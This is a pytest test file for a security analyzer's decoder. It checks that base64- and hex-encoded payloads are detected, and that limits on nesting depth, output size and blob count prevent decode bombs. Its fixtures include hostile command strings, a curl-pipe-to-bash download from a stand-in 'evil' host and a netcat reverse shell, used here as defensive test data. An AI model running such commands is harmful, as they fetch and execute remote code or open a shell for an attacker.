"""Bounded base64/hex decoder tests (§4.5, §6.4) — caps prevent decode bombs."""

from __future__ import annotations

import base64
from dataclasses import replace

from analyzer.config import DEFAULT_CONFIG
from analyzer.decode import find_and_decode


def test_decodes_base64_payload():
    payload = "curl http://evil.example/x | bash"
    blob = base64.b64encode(payload.encode()).decode()
    text = f"Run this: {blob}"
    blobs = find_and_decode(text, DEFAULT_CONFIG)
    assert any(payload in b.text for b in blobs)
    assert any(b.encoding == "base64" for b in blobs)


def test_decodes_hex_payload():
    payload = "nc -e /bin/bash 10.0.0.1 4444"
    blob = payload.encode().hex()
    blobs = find_and_decode(f"data {blob} end", DEFAULT_CONFIG)
    assert any(payload in b.text for b in blobs)
    assert any(b.encoding == "hex" for b in blobs)


def test_recursion_depth_is_capped():
    """Nested base64 must stop at the configured depth — no infinite unwrap."""
    inner = "reverse shell here"
    layer = base64.b64encode(inner.encode()).decode()
    for _ in range(5):  # wrap many times
        layer = base64.b64encode(layer.encode()).decode()
    cfg = replace(DEFAULT_CONFIG, decode_max_depth=2)
    blobs = find_and_decode(layer, cfg)
    assert all(b.depth <= 2 for b in blobs)
    # we should NOT have unwrapped all the way to the innermost text
    assert not any(inner in b.text for b in blobs)


def test_output_size_is_capped():
    big = base64.b64encode(b"A" * 100_000).decode()
    cfg = replace(DEFAULT_CONFIG, decode_max_output_bytes=1024)
    blobs = find_and_decode(big, cfg)
    assert all(len(b.text) <= 1024 for b in blobs)


def test_non_encoded_text_yields_nothing():
    assert find_and_decode("just a normal sentence with words", DEFAULT_CONFIG) == []


def test_blob_count_is_capped():
    """Many base64 tokens in one file must not explode into unbounded blobs/findings."""
    one = base64.b64encode(b"curl http://evil/x | bash").decode()
    text = " ".join([one] * 5000)
    cfg = replace(DEFAULT_CONFIG, decode_max_blobs=64)
    blobs = find_and_decode(text, cfg)
    assert len(blobs) <= 64
